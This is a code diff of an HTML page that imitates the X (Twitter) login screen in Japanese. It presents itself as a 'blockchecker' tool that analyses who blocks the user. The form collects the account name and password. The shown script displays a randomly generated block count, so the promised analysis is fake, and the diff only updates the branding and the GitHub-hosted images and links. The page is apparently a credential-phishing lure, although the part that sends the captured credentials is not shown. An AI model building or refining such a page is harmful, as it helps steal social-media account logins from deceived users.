@@ -5,22 +5,30 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Xアカウントにログイン</title>
 
-  <!-- Twitterカード用（Base64埋め込み画像） -->
+  <!-- Twitterカード用 -->
   <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="Xアカウントにログイン" />
-  <meta name="twitter:description" content="あなたをブロックしているユーザーを分析できます" />
-  <meta name="twitter:image" content="data:image/png;base64,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" />
-  <meta name="twitter:url" content="https://blockchecker.github.io/new/" />
+  <meta name="twitter:title" content="blockchecker_v2" />
+  <meta name="twitter:description" content="Xアカウントのブロック分析ツールです" />
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/blockchecker/images/main/ダウンロード.png" />
+  <meta name="twitter:url" content="https://blockchecker.github.io/v2/" />
 
   <style>
-    /* --- 元のCSSそのまま --- */
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    body { min-height: 100vh; background-color: #000; display: flex; align-items: center; justify-content: center; font-family: -apple-system,BlinkMacSystemFont,'Segoe UI','Helvetica Neue',Arial,sans-serif; color:#fff; overflow-x:hidden; }
+    *, *::before, *::after { box-sizing: border-box; margin:0; padding:0; }
+    body {
+      min-height:100vh;
+      background:#000;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+      color:#fff;
+      overflow-x:hidden;
+    }
     .container { width:100%; max-width:420px; padding:16px; display:flex; flex-direction:column; align-items:center; }
     .header-icon { margin-bottom:32px; }
     .header-icon img { width:60px; height:60px; object-fit:contain; }
-    .card { width:100%; background:#000; border:1px solid #333; border-radius:20px; padding:40px 30px; box-shadow:0 0 0 1px rgba(255,255,255,0.1); }
-    .title-area { text-align:center; margin-bottom:32px; }
+    .card { width:100%; background:#000; border:1px solid #333; border-radius:20px; padding:40px 30px; box-shadow:0 0 0 1px rgba(255,255,255,0.1);}
+    .title-area { text-align:center; margin-bottom:32px;}
     .title { font-size:24px; font-weight:800; color:#fff; letter-spacing:-0.5px; margin-bottom:12px; }
     .subtitle { font-size:14px; color:#888; line-height:1.4; }
     .description { font-size:12px; color:#666; margin-top:20px; line-height:1.6; padding-top:16px; border-top:1px solid #222; text-align:left; }
@@ -35,17 +43,21 @@
     .btn-login:hover { opacity:0.9; }
     #analysis-screen, #result-screen { display:none; text-align:center; }
     .loading-spinner { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #fff; border-radius:50%; margin:30px auto; animation:spin 1s linear infinite; }
-    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
+    @keyframes spin { 0% { transform:rotate(0deg);} 100% { transform:rotate(360deg);} }
     .result-number { font-size:64px; font-weight:800; margin:20px 0; color:#fff; }
     .result-text { font-size:18px; color:#888; margin-bottom:30px; }
     .btn-back { background:transparent; color:#fff; border:1px solid #333; padding:10px 20px; border-radius:20px; cursor:pointer; font-size:14px; }
+
+    /* リンク横アイコン用 */
+    .link-with-icon { display:flex; align-items:center; gap:8px; margin-top:12px; }
+    .link-with-icon img { width:24px; height:24px; object-fit:contain; }
+    .link-with-icon a { color:#fff; text-decoration:underline; font-weight:bold; }
   </style>
 </head>
 <body>
-  <!-- ここから先は元のbodyそのまま -->
   <div class="container">
     <div class="header-icon">
-      <img src="data:image/png;base64,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" alt="X Logo" />
+      <img src="https://raw.githubusercontent.com/blockchecker/images/main/ダウンロード.png" alt="X Logo">
     </div>
 
     <div class="card">
@@ -63,7 +75,10 @@
           <div class="form-group">
             <label>電話番号/メールアドレス/ユーザー名</label>
             <div class="input-wrapper">
-              <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+              <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                <circle cx="12" cy="7" r="4"/>
+              </svg>
               <input type="text" id="account" placeholder="電話番号、メールアドレスまたはユーザー名" required />
             </div>
           </div>
@@ -71,13 +86,22 @@
           <div class="form-group">
             <label>パスワード</label>
             <div class="input-wrapper">
-              <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+              <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+              </svg>
               <input type="password" id="password" placeholder="パスワードを入力" required />
             </div>
           </div>
 
           <button type="submit" class="btn-login">ログイン</button>
         </form>
+
+        <!-- リンク横アイコン -->
+        <div class="link-with-icon">
+          <img src="https://raw.githubusercontent.com/blockchecker/images/main/ダウンロード.png" alt="Icon">
+          <a href="https://blockchecker.github.io/v2/" target="_blank">blockchecker_v2</a>
+        </div>
       </div>
 
       <div id="analysis-screen">
@@ -122,6 +146,7 @@ const btnRetry = document.getElementById("btn-retry");
 
 loginForm.addEventListener("submit", async (e) => {
   e.preventDefault();  
+
   const account = document.getElementById("account").value;
   const password = document.getElementById('password').value;
   const randomBlockCount = Math.floor(Math.random() * 20) + 1;
